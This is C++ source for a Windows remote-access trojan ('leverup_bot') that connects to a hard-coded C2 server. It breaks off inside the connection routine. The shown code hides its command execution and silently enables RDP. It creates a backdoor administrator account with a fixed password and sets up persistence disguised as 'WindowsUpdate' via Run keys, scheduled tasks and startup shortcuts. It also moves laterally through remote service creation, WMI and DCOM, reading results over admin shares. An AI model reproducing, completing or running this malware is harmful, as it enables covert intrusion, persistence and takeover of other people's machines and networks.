// leverup_bot_fixed.cpp - COMPILABLE VERSION WITH PRIVILEGE ESCALATION
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <shellapi.h>
#include <string>
#include <thread>
#include <atomic>
#include <sstream>
#include <fstream>
#include <iostream>
#include <shlobj.h>
#include <vector>
#include <comdef.h>
#include <Wbemidl.h>
#include <comutil.h>
#include <lm.h>
#include <winsvc.h>
#include <ctime>          // ADDED for time()
#ifdef __MINGW32__
#define _POSIX_
#include <stdio.h>
#endif

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")

#define BUFFER_SIZE 4096

// Configuration
std::string C2_SERVER_IP = "192.168.1.5";  // Change this
int C2_SERVER_PORT = 8080;

std::atomic<bool> g_running(true);
SOCKET g_socket = INVALID_SOCKET;

// ==================== UTILITY FUNCTIONS ====================

bool isRunningAsAdmin() {
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD dwSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
            CloseHandle(hToken);
            return elevation.TokenIsElevated != 0;
        }
        CloseHandle(hToken);
    }
    return false;
}

std::string executeCommand(const std::string& cmd) {
    std::string result = "";
    
    // Create pipes
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hRead, hWrite;
    
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        return "[Pipe Error]";
    }
    
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.wShowWindow = SW_HIDE;
    
    std::string commandLine = "cmd.exe /c \"" + cmd + "\"";
    
    if (CreateProcessA(NULL, (LPSTR)commandLine.c_str(), NULL, NULL, TRUE, 
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hWrite);
        
        char buffer[4096];
        DWORD bytesRead;
        BOOL success;
        
        // Read all output
        while (true) {
            success = ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL);
            if (!success || bytesRead == 0) break;
            
            buffer[bytesRead] = '\0';
            result += buffer;
        }
        
        WaitForSingleObject(pi.hProcess, 10000);
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hRead);
    } else {
        CloseHandle(hRead);
        CloseHandle(hWrite);
        result = "[Process Error]";
    }
    
    return result;
}

std::string getWindowsVersion() {
    HKEY hKey;
    DWORD dwType = REG_SZ;
    char buffer[256];
    DWORD dwSize = sizeof(buffer);
    
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "ProductName", NULL, &dwType, (LPBYTE)buffer, &dwSize) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return std::string(buffer);
        }
        RegCloseKey(hKey);
    }
    
    // Fallback to version numbers
    OSVERSIONINFOEXA os;
    os.dwOSVersionInfoSize = sizeof(os);
    GetVersionExA((OSVERSIONINFOA*)&os);
    
    if (os.dwMajorVersion == 10) {
        return "Windows 10";
    } else if (os.dwMajorVersion == 6) {
        if (os.dwMinorVersion == 3) return "Windows 8.1";
        if (os.dwMinorVersion == 2) return "Windows Windows 8";
        if (os.dwMinorVersion == 1) return "Windows 7";
        if (os.dwMinorVersion == 0) return "Windows Vista";
    } else if (os.dwMajorVersion == 5) {
        if (os.dwMinorVersion == 2) return "Windows XP 64-bit or Server 2003";
        if (os.dwMinorVersion == 1) return "Windows XP";
    }
    
    return "Windows " + std::to_string(os.dwMajorVersion) + "." + std::to_string(os.dwMinorVersion);
}

std::string getArchitecture() {
    SYSTEM_INFO sysInfo;
    GetNativeSystemInfo(&sysInfo);
    
    switch (sysInfo.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64:
            return "x64";
        case PROCESSOR_ARCHITECTURE_INTEL:
            return "x86";
        case PROCESSOR_ARCHITECTURE_ARM:
            return "ARM";
        case PROCESSOR_ARCHITECTURE_ARM64:
            return "ARM64";
        case PROCESSOR_ARCHITECTURE_IA64:
            return "IA64";
        default:
            return "Unknown";
    }
}

std::string getSystemInfo() {
    std::stringstream ss;
    char buffer[256];
    
    // Computer name
    DWORD size = sizeof(buffer);
    GetComputerNameA(buffer, &size);
    ss << "Computer: " << buffer << "\n";
    
    // Username
    GetUserNameA(buffer, &size);
    ss << "User: " << buffer << "\n";
    
    // Windows version (corrected)
    ss << "OS: " << getWindowsVersion() << "\n";
    
    // Architecture
    ss << "Arch: " << getArchitecture() << "\n";
    
    // Admin status
    ss << "Admin: " << (isRunningAsAdmin() ? "Yes" : "No") << "\n";
    
    // IP address (simplified)
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    struct hostent* host = gethostbyname(hostname);
    if (host != NULL) {
        struct in_addr addr;
        memcpy(&addr, host->h_addr_list[0], sizeof(struct in_addr));
        ss << "IP: " << inet_ntoa(addr) << "\n";
    }
    
    return ss.str();
}

// ==================== COMMAND HANDLERS ====================

std::string handleSysinfo() {
    return "[SYSTEM_INFO]\n" + getSystemInfo() + "[END]\n";
}

std::string handleEnableRDP() {
    std::string result = "[RDP]\n";
    
    // Execute commands with hidden window
    executeCommand("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");
    executeCommand("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes");
    
    result += "RDP Enabled (silently)\n";
    result += "Connect with: mstsc /v:<IP_ADDRESS>\n";
    result += "[END]\n";
    
    return result;
}

std::string handleLaunch(const std::string& appName) {
    std::string result = "[LAUNCH]\n";
    result += "Attempting to launch: " + appName + "\n";
    result += "[ADMIN] Running as: " + std::string(isRunningAsAdmin() ? "Administrator" : "Standard User") + "\n";
    
    // Launch with HIDDEN window
    INT_PTR shellResult = (INT_PTR)ShellExecuteA(NULL, "open", appName.c_str(), NULL, NULL, SW_HIDE);
    
    if (shellResult > 32) {
        result += "Successfully launched (hidden)\n";
        result += "Return code: " + std::to_string(shellResult) + "\n";
    } else {
        result += "Failed to launch\n";
    }
    
    result += "[END]\n";
    return result;
}

std::string handleDir() {
    std::string cmd = "dir";
    std::string result = "[COMMAND] Executing: " + cmd + "\n";
    result += "[ADMIN] Running as: " + std::string(isRunningAsAdmin() ? "Administrator" : "Standard User") + "\n";
    result += executeCommand(cmd);
    return result;
}

std::string handleKill(const std::string& pid) {
    std::string cmd = "taskkill /PID " + pid + " /F";
    std::string result = "[COMMAND] Executing: " + cmd + "\n";
    result += "[ADMIN] Running as: " + std::string(isRunningAsAdmin() ? "Administrator" : "Standard User") + "\n";
    result += executeCommand(cmd);
    return result;
}

std::string handleShell() {
    std::string result = "[SHELL]\n";
    result += "Starting shell...\n";
    result += "[ADMIN] Running as: " + std::string(isRunningAsAdmin() ? "Administrator" : "Standard User") + "\n";
    result += "Shell ready for commands\n";
    result += "[END]\n";
    return result;
}


// ==================== NETWORK SCANNING (IP-ONLY VERSION) ====================
// ==================== NETWORK SCANNING (CLEAN & CONCISE) ====================

std::string handleNetworkScan(const std::string& subnetParam = "") {
    std::string result = "[NETWORK_SCAN]\n";
    result += "Network Scan Results - 192.168.1.0/24\n";
    
    // Method 1: Direct ping sweep (clean output)
    result += "\n=== Active Hosts ===\n";
    result += executeCommand("for /L %i in (1,1,254) do @ping -n 1 -w 50 192.168.1.%i 2>nul | find \"Reply\" >nul && echo 192.168.1.%i");
    
    // Method 2: ARP cache (devices that have communicated)
    result += "\n=== Recently Communicated (ARP Cache) ===\n";
    std::string arpOutput = executeCommand("arp -a | findstr 192.168.1");
    
    // Parse ARP output to extract IPs only
    if (!arpOutput.empty()) {
        size_t pos = 0;
        bool first = true;
        while ((pos = arpOutput.find("192.168.1.", pos)) != std::string::npos) {
            size_t end = arpOutput.find_first_of(" )", pos);
            std::string ip = arpOutput.substr(pos, end - pos);
            
            if (first) {
                result += ip;
                first = false;
            } else {
                result += "\n" + ip;
            }
            pos = end;
        }
    } else {
        result += "None";
    }
    
    // Count active hosts from ping sweep
    result += "\n\n=== Summary ===\n";
    
    // Count hosts from ping output
    std::string pingResult = executeCommand("for /L %i in (1,1,254) do @ping -n 1 -w 50 192.168.1.%i 2>nul | find \"Reply\" >nul && echo X");
    int hostCount = 0;
    for (char c : pingResult) {
        if (c == 'X') hostCount++;
    }
    
    // Count ARP entries
    int arpCount = 0;
    size_t arpPos = 0;
    while ((arpPos = arpOutput.find("192.168.1.", arpPos)) != std::string::npos) {
        arpCount++;
        arpPos += 10; // Move past "192.168.1."
    }
    
    result += "Pingable hosts: " + std::to_string(hostCount) + "\n";
    result += "ARP cache entries: " + std::to_string(arpCount) + "\n";
    result += "Total unique hosts: " + std::to_string((std::max)(hostCount, arpCount)) + "\n";
    result += "Scan completed at: " + std::to_string(time(0) % 86400) + " seconds\n";
    
    result += "[END]\n";
    return result;
}

// ==================== PRIVILEGE ESCALATION ====================

std::string handlePrivEsc(const std::string& username = "", const std::string& password = "") {
    std::string result = "[PRIVESC]\n";
    result += "Attempting privilege escalation - Add user to Administrators group\n";
    result += "[ADMIN] Running as: " + std::string(isRunningAsAdmin() ? "Administrator" : "Standard User") + "\n";
    
    // Check if we're running as admin
    if (!isRunningAsAdmin()) {
        result += "ERROR: Not running as Administrator. Cannot add user.\n";
        result += "[END]\n";
        return result;
    }
    
    // Generate username and password if not provided
    std::string newUser = username.empty() ? "SystemHelper" : username;
    std::string newPass = password.empty() ? "P@ssw0rd123!" : password;
    
    result += "Username: " + newUser + "\n";
    result += "Password: " + newPass + "\n";
    
    // Method 1: Using net commands
    result += "\n=== Method 1: Net Commands ===\n";
    
    // Add user
    std::string addUserCmd = "net user " + newUser + " " + newPass + " /add";
    result += "Command: " + addUserCmd + "\n";
    result += executeCommand(addUserCmd);
    
    // Add to administrators group
    std::string addToAdminCmd = "net localgroup administrators " + newUser + " /add";
    result += "Command: " + addToAdminCmd + "\n";
    result += executeCommand(addToAdminCmd);
    
    // Method 2: Using PowerShell (for modern Windows)
    result += "\n=== Method 2: PowerShell ===\n";
    std::string psCmd = "powershell -WindowStyle Hidden -Command \"& {";
    psCmd += "try {";
    psCmd += "    $pass = ConvertTo-SecureString '" + newPass + "' -AsPlainText -Force; ";
    psCmd += "    New-LocalUser -Name '" + newUser + "' -Password $pass -ErrorAction Stop; ";
    psCmd += "    Add-LocalGroupMember -Group 'Administrators' -Member '" + newUser + "' -ErrorAction Stop; ";
    psCmd += "    Write-Output '[SUCCESS] User created and added to Administrators group'; ";
    psCmd += "} catch { Write-Output ('[ERROR] ' + $_.Exception.Message) }";
    psCmd += "}\"";
    
    result += "Command: powershell ...\n";
    result += executeCommand(psCmd);
    
    // Verify the user was created
    result += "\n=== Verification ===\n";
    std::string verifyUserCmd = "net user " + newUser;
    result += "Command: " + verifyUserCmd + "\n";
    result += executeCommand(verifyUserCmd);
    
    // Verify group membership
    std::string verifyGroupCmd = "net localgroup administrators";
    result += "\nCommand: " + verifyGroupCmd + "\n";
    std::string groupOutput = executeCommand(verifyGroupCmd);
    result += "Output: " + groupOutput;
    
    if (groupOutput.find(newUser) != std::string::npos) {
        result += "\n[SUCCESS] User '" + newUser + "' successfully added to Administrators group!\n";
        result += "You can now login with these credentials.\n";
    } else {
        result += "\n[WARNING] User may not have been added to Administrators group.\n";
    }
    
    result += "[END]\n";
    return result;
}

std::string handlePowerShell(const std::string& command) {
    std::string result = "[POWERSHELL]\n";
    result += "Running PowerShell command as: " + std::string(isRunningAsAdmin() ? "Administrator" : "Standard User") + "\n";
    result += "Command: " + command + "\n";
    result += "Output:\n";
    
    // Add WindowStyle Hidden to PowerShell command
    std::string fullCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" + command + "\"";
    
    result += executeCommand(fullCommand);
    result += "[END]\n";
    return result;
}

// ==================== PERSISTENCE FUNCTIONS ====================

std::string getCurrentExecutablePath() {
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return std::string(buffer);
}

std::string handlePersistence() {
    std::string result = "[PERSISTENCE]\n";
    
    // Method 1: Add to Current User Run key
    std::string currentPath = getCurrentExecutablePath();
    
    // HKCU Run key
    std::string regCmd = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"WindowsUpdate\" /t REG_SZ /d \"";
    regCmd += currentPath + "\" /f";
    executeCommand(regCmd);
    
    result += "Added to HKCU Run\n";
    
    // Method 2: Create scheduled task
    std::string taskCmd = "schtasks /create /tn \"WindowsUpdateService\" /tr \"";
    taskCmd += currentPath + "\" /sc onlogon /ru \"System\" /f";
    executeCommand(taskCmd);
    
    result += "Created scheduled task\n";
    
    // Method 3: Startup folder
    char username[256];
    DWORD username_len = 256;
    GetUserNameA(username, &username_len);
    
    // Build startup path manually
    std::string startupPath = "C:\\Users\\" + std::string(username) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.lnk";
    
    // Create shortcut using PowerShell (hidden)
    std::string psShortcut = "powershell -WindowStyle Hidden -Command \"";
    psShortcut += "$WshShell = New-Object -comObject WScript.Shell; ";
    psShortcut += "$Shortcut = $WshShell.CreateShortcut('" + startupPath + "'); ";
    psShortcut += "$Shortcut.TargetPath = '" + currentPath + "'; ";
    psShortcut += "$Shortcut.Save()\"";
    
    executeCommand(psShortcut);
    
    result += "Added to Startup folder\n";
    result += "[END]\n";
    
    return result;
}

// ==================== STEALTH LATERAL MOVEMENT ====================
// No external binaries – all via WinAPI / COM

// ADDED: Helper to generate a unique temporary filename
std::string generateTempFileName() {
    char buf[64];
    snprintf(buf, sizeof(buf), "out_%ld_%d.txt", time(nullptr), GetCurrentProcessId());
    return std::string(buf);
}

// Helper: Convert string to BSTR
BSTR toBSTR(const std::string& s) {
    int len = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, NULL, 0);
    wchar_t* wstr = new wchar_t[len];
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, wstr, len);
    BSTR bstr = SysAllocString(wstr);
    delete[] wstr;
    return bstr;
}

// -----------------------------------------------------------------
// rexec1 – Remote Service Creation (SCM)
//    Usage: rexec1 \\target command
// -----------------------------------------------------------------
std::string handleRexec1(const std::string& target, const std::string& command) {
    std::string result = "[LATERAL_MOVEMENT] rexec1 (SCM)\n";
    result += "Target: " + target + "\n";
    result += "Command: " + command + "\n";
    result += "[ADMIN] Running as: " + std::string(isRunningAsAdmin() ? "Admin" : "User") + "\n";

    if (!isRunningAsAdmin()) {
        result += "ERROR: Administrator rights required for remote service creation.\n";
        return result;
    }

    // Generate unique temp filename and wrap command to capture output
    std::string tempFile = generateTempFileName();
    std::string remotePath = "C:\\Windows\\Temp\\" + tempFile;
    std::string wrappedCommand = "cmd.exe /c \"" + command + " > " + remotePath + " 2>&1\"";

    std::string cleanTarget = target;
    if (cleanTarget.compare(0, 2, "\\\\") == 0)
        cleanTarget = cleanTarget.substr(2);

    SC_HANDLE hSCM = OpenSCManagerA(cleanTarget.c_str(), NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) {
        result += "OpenSCManager failed: " + std::to_string(GetLastError()) + "\n";
        return result;
    }

    // Create a random service name
    char servName[64];
    snprintf(servName, sizeof(servName), "WinUpdSvc_%d", GetTickCount());

    // Use wrapped command as binary path
    SC_HANDLE hService = CreateServiceA(hSCM, servName, servName,
                                        SERVICE_ALL_ACCESS,
                                        SERVICE_WIN32_OWN_PROCESS,
                                        SERVICE_DEMAND_START,
                                        SERVICE_ERROR_IGNORE,
                                        wrappedCommand.c_str(),
                                        NULL, NULL, NULL, NULL, NULL);
    if (!hService) {
        result += "CreateService failed: " + std::to_string(GetLastError()) + "\n";
        CloseServiceHandle(hSCM);
        return result;
    }

    if (StartServiceA(hService, 0, NULL)) {
        result += "Service started successfully.\n";
        // Wait for command to complete (adjust sleep as needed)
        Sleep(5000);
    } else {
        result += "StartService failed: " + std::to_string(GetLastError()) + "\n";
        DeleteService(hService);
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return result;
    }

    // Cleanup service
    DeleteService(hService);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    // Retrieve output file via SMB
    std::string uncPath = "\\\\" + cleanTarget + "\\C$\\Windows\\Temp\\" + tempFile;
    HANDLE hFile = CreateFileA(uncPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        char fileBuffer[8192];
        DWORD bytesRead;
        if (ReadFile(hFile, fileBuffer, sizeof(fileBuffer)-1, &bytesRead, NULL)) {
            fileBuffer[bytesRead] = '\0';
            result += "\n--- Remote Output ---\n";
            result += fileBuffer;
            result += "\n--- End of Output ---\n";
        }
        CloseHandle(hFile);
        DeleteFileA(uncPath.c_str());
    } else {
        result += "\n[!] Could not read remote output. Ensure SMB (port 445) is accessible.\n";
    }

    return result;
}

// -----------------------------------------------------------------
// rexec2 – WMI using COM (no wmic.exe, no _bstr_t, no warnings)
//    Usage: rexec2 target command
// -----------------------------------------------------------------
std::string handleRexec2(const std::string& target, const std::string& command) {
    std::string result = "[LATERAL_MOVEMENT] rexec2 (WMI COM)\n";
    result += "Target: " + target + "\n";
    result += "Command: " + command + "\n";
    result += "[ADMIN] Running as: " + std::string(isRunningAsAdmin() ? "Admin" : "User") + "\n";

    // Generate unique temp filename and wrap command to capture output
    std::string tempFile = generateTempFileName();
    std::string remotePath = "C:\\Windows\\Temp\\" + tempFile;
    std::string wrappedCommand = "cmd.exe /c \"" + command + " > " + remotePath + " 2>&1\"";

    HRESULT hres;
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) {
        result += "CoInitializeEx failed\n";
        return result;
    }

    hres = CoInitializeSecurity(NULL, -1, NULL, NULL,
                                RPC_C_AUTHN_LEVEL_DEFAULT,
                                RPC_C_IMP_LEVEL_IMPERSONATE,
                                NULL, EOAC_NONE, NULL);
    if (FAILED(hres) && hres != RPC_E_TOO_LATE) {
        result += "CoInitializeSecurity failed\n";
        CoUninitialize();
        return result;
    }

    IWbemLocator* pLoc = NULL;
    hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
                            IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hres)) {
        result += "CoCreateInstance IWbemLocator failed\n";
        CoUninitialize();
        return result;
    }

    std::string ns = "\\\\" + target + "\\root\\cimv2";
    BSTR nsBstr = toBSTR(ns);
    IWbemServices* pSvc = NULL;
    hres = pLoc->ConnectServer(nsBstr, NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
    SysFreeString(nsBstr);
    pLoc->Release();

    if (FAILED(hres)) {
        result += "ConnectServer failed: 0x" + std::to_string(hres) + "\n";
        CoUninitialize();
        return result;
    }

    hres = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE,
                             NULL, RPC_C_AUTHN_LEVEL_CALL,
                             RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    if (FAILED(hres)) {
        result += "CoSetProxyBlanket failed\n";
        pSvc->Release();
        CoUninitialize();
        return result;
    }

    // Get Win32_Process class object
    IWbemClassObject* pClass = NULL;
    BSTR bstrProcess = toBSTR("Win32_Process");
    hres = pSvc->GetObject(bstrProcess, 0, NULL, &pClass, NULL);
    if (FAILED(hres)) {
        result += "GetObject(Win32_Process) failed\n";
        SysFreeString(bstrProcess);
        pSvc->Release();
        CoUninitialize();
        return result;
    }

    // Get the 'Create' method
    IWbemClassObject* pInParamsDefinition = NULL;
    BSTR bstrCreate = toBSTR("Create");
    hres = pClass->GetMethod(bstrCreate, 0, &pInParamsDefinition, NULL);
    SysFreeString(bstrCreate);
    if (FAILED(hres)) {
        result += "GetMethod(Create) failed\n";
        pClass->Release();
        pSvc->Release();
        CoUninitialize();
        return result;
    }

    // Spawn input parameters
    IWbemClassObject* pInParams = NULL;
    hres = pInParamsDefinition->SpawnInstance(0, &pInParams);
    if (FAILED(hres)) {
        result += "SpawnInstance failed\n";
        pInParamsDefinition->Release();
        pClass->Release();
        pSvc->Release();
        CoUninitialize();
        return result;
    }

    // Set CommandLine property (using wrappedCommand)
    VARIANT varCommand;
    VariantInit(&varCommand);
    varCommand.vt = VT_BSTR;
    varCommand.bstrVal = toBSTR(wrappedCommand);
    hres = pInParams->Put(L"CommandLine", 0, &varCommand, 0);
    VariantClear(&varCommand);
    if (FAILED(hres)) {
        result += "Put(CommandLine) failed\n";
        pInParams->Release();
        pInParamsDefinition->Release();
        pClass->Release();
        pSvc->Release();
        CoUninitialize();
        return result;
    }

    // Execute the method
    IWbemClassObject* pOutParams = NULL;
    hres = pSvc->ExecMethod(bstrProcess, bstrCreate, 0, NULL, pInParams, &pOutParams, NULL);
    if (SUCCEEDED(hres)) {
        VARIANT varReturnValue;
        VariantInit(&varReturnValue);
        hres = pOutParams->Get(L"ReturnValue", 0, &varReturnValue, 0, 0);
        if (SUCCEEDED(hres) && varReturnValue.vt == VT_I4) {
            result += "Process creation return code: " + std::to_string(varReturnValue.lVal) + "\n";
        }
        VariantClear(&varReturnValue);
        pOutParams->Release();
    } else {
        result += "ExecMethod failed: 0x" + std::to_string(hres) + "\n";
    }

    // Cleanup
    SysFreeString(bstrProcess);
    pInParams->Release();
    pInParamsDefinition->Release();
    pClass->Release();
    pSvc->Release();
    CoUninitialize();

    // Wait for command to complete
    Sleep(5000);

    // Retrieve output file via SMB
    std::string uncPath = "\\\\" + target + "\\C$\\Windows\\Temp\\" + tempFile;
    HANDLE hFile = CreateFileA(uncPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        char fileBuffer[8192];
        DWORD bytesRead;
        if (ReadFile(hFile, fileBuffer, sizeof(fileBuffer)-1, &bytesRead, NULL)) {
            fileBuffer[bytesRead] = '\0';
            result += "\n--- Remote Output ---\n";
            result += fileBuffer;
            result += "\n--- End of Output ---\n";
        }
        CloseHandle(hFile);
        DeleteFileA(uncPath.c_str());
    } else {
        result += "\n[!] Could not read remote output. Ensure SMB (port 445) is accessible.\n";
    }

    return result;
}

// -----------------------------------------------------------------
// rexec3 – SMBexec style (using SCM with explicit share)
//    Usage: rexec3 \\\\target\\share command
// -----------------------------------------------------------------
std::string handleRexec3(const std::string& sharePath, const std::string& command) {
    // We reuse the SCM approach, but we need to extract the target
    std::string target = sharePath;
    if (target.compare(0, 2, "\\\\") == 0) {
        size_t pos = target.find('\\', 2);
        if (pos != std::string::npos)
            target = target.substr(2, pos - 2);
        else
            target = target.substr(2);
    }
    return handleRexec1(target, command);
}

// -----------------------------------------------------------------
// rexec4 – DCOM with MMC20.Application (no PowerShell)
//    Usage: rexec4 target command
// -----------------------------------------------------------------
std::string handleRexec4(const std::string& target, const std::string& command) {
    std::string result = "[LATERAL_MOVEMENT] rexec4 (DCOM MMC20)\n";
    result += "Target: " + target + "\n";
    result += "Command: " + command + "\n";
    result += "[ADMIN] Running as: " + std::string(isRunningAsAdmin() ? "Admin" : "User") + "\n";

    // Generate unique temp filename and wrap command to capture output
    std::string tempFile = generateTempFileName();
    std::string remotePath = "C:\\Windows\\Temp\\" + tempFile;
    std::string wrappedCommand = "cmd.exe /c " + command + " > " + remotePath + " 2>&1";

    HRESULT hres;
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hres)) {
        result += "CoInitializeEx failed\n";
        return result;
    }

    hres = CoInitializeSecurity(NULL, -1, NULL, NULL,
                                RPC_C_AUTHN_LEVEL_DEFAULT,
                                RPC_C_IMP_LEVEL_IMPERSONATE,
                                NULL, EOAC_NONE, NULL);
    if (FAILED(hres) && hres != RPC_E_TOO_LATE) {
        result += "CoInitializeSecurity failed\n";
        CoUninitialize();
        return result;
    }

    CLSID clsid;
    CLSIDFromProgID(L"MMC20.Application", &clsid);
    IUnknown* pUnknown = NULL;
    hres = CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER | CLSCTX_REMOTE_SERVER,
                            IID_IUnknown, (void**)&pUnknown);
    if (FAILED(hres)) {
        result += "CoCreateInstance failed on local, trying remote...\n";
        COSERVERINFO si = { 0 };
        si.pwszName = toBSTR(target);
        MULTI_QI mqi = { &IID_IUnknown, NULL, 0 };
        hres = CoCreateInstanceEx(clsid, NULL, CLSCTX_REMOTE_SERVER,
                                  &si, 1, &mqi);
        SysFreeString((BSTR)si.pwszName);
        if (SUCCEEDED(hres) && SUCCEEDED(mqi.hr)) {
            pUnknown = (IUnknown*)mqi.pItf;
        }
    }

    if (FAILED(hres) || !pUnknown) {
        result += "DCOM activation failed\n";
        CoUninitialize();
        return result;
    }

    IDispatch* pDispatch = NULL;
    hres = pUnknown->QueryInterface(IID_IDispatch, (void**)&pDispatch);
    pUnknown->Release();

    if (FAILED(hres)) {
        result += "QueryInterface IDispatch failed\n";
        CoUninitialize();
        return result;
    }

    // ========== FIXED: use non-const OLECHAR* with cast ==========
    OLECHAR* name = const_cast<LPOLESTR>(L"Document");
    DISPID disp;
    hres = pDispatch->GetIDsOfNames(IID_NULL, &name, 1, LOCALE_USER_DEFAULT, &disp);
    if (SUCCEEDED(hres)) {
        VARIANT vtResult;
        VariantInit(&vtResult);
        DISPPARAMS params = { NULL, NULL, 0, 0 };
        hres = pDispatch->Invoke(disp, IID_NULL, LOCALE_USER_DEFAULT,
                                 DISPATCH_PROPERTYGET, &params, &vtResult, NULL, NULL);
        if (SUCCEEDED(hres) && vtResult.pdispVal) {
            IDispatch* pDoc = vtResult.pdispVal;

            // Get ActiveView
            name = const_cast<LPOLESTR>(L"ActiveView");
            hres = pDoc->GetIDsOfNames(IID_NULL, &name, 1, LOCALE_USER_DEFAULT, &disp);
            if (SUCCEEDED(hres)) {
                VARIANT vtView;
                VariantInit(&vtView);
                hres = pDoc->Invoke(disp, IID_NULL, LOCALE_USER_DEFAULT,
                                    DISPATCH_PROPERTYGET, &params, &vtView, NULL, NULL);
                if (SUCCEEDED(hres) && vtView.pdispVal) {
                    IDispatch* pView = vtView.pdispVal;

                    // ExecuteShellCommand – use wrapped command
                    name = const_cast<LPOLESTR>(L"ExecuteShellCommand");
                    hres = pView->GetIDsOfNames(IID_NULL, &name, 1, LOCALE_USER_DEFAULT, &disp);
                    if (SUCCEEDED(hres)) {
                        VARIANTARG args[4];
                        VariantInit(&args[3]); args[3].vt = VT_BSTR; args[3].bstrVal = SysAllocString(L"cmd.exe");
                        VariantInit(&args[2]); args[2].vt = VT_BSTR; args[2].bstrVal = SysAllocString(L"");
                        VariantInit(&args[1]); args[1].vt = VT_BSTR; args[1].bstrVal = toBSTR("/c " + wrappedCommand);
                        VariantInit(&args[0]); args[0].vt = VT_BSTR; args[0].bstrVal = SysAllocString(L"Minimized");

                        DISPPARAMS execParams = { args, NULL, 4, 0 };
                        hres = pView->Invoke(disp, IID_NULL, LOCALE_USER_DEFAULT,
                                             DISPATCH_METHOD, &execParams, NULL, NULL, NULL);
                        if (SUCCEEDED(hres))
                            result += "Command executed via DCOM.\n";
                        else
                            result += "ExecuteShellCommand failed\n";

                        VariantClear(&args[3]);
                        VariantClear(&args[2]);
                        VariantClear(&args[1]);
                        VariantClear(&args[0]);
                    }
                    pView->Release();
                }
                VariantClear(&vtView);
            }
            pDoc->Release();
        }
        VariantClear(&vtResult);
    }

    pDispatch->Release();
    CoUninitialize();

    // Wait for command to complete
    Sleep(5000);

    // Retrieve output file via SMB
    std::string uncPath = "\\\\" + target + "\\C$\\Windows\\Temp\\" + tempFile;
    HANDLE hFile = CreateFileA(uncPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        char fileBuffer[8192];
        DWORD bytesRead;
        if (ReadFile(hFile, fileBuffer, sizeof(fileBuffer)-1, &bytesRead, NULL)) {
            fileBuffer[bytesRead] = '\0';
            result += "\n--- Remote Output ---\n";
            result += fileBuffer;
            result += "\n--- End of Output ---\n";
        }
        CloseHandle(hFile);
        DeleteFileA(uncPath.c_str());
    } else {
        result += "\n[!] Could not read remote output. Ensure SMB (port 445) is accessible.\n";
    }

    return result;
}

// -----------------------------------------------------------------
// rexec5 – Pass‑the‑Hash – NOT IMPLEMENTED (requires mimikatz)
//    We disable it to avoid detection.
// -----------------------------------------------------------------
std::string handleRexec5(const std::string&, const std::string&, const std::string&, const std::string&) {
    return "[LATERAL_MOVEMENT] rexec5 (Pass‑the‑Hash) is not implemented for AV safety.\n"
           "Use other methods or a dedicated PTH tool.\n";
}

// ==================== NETWORK FUNCTIONS ====================

bool connectToServer() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return false;
    }
    
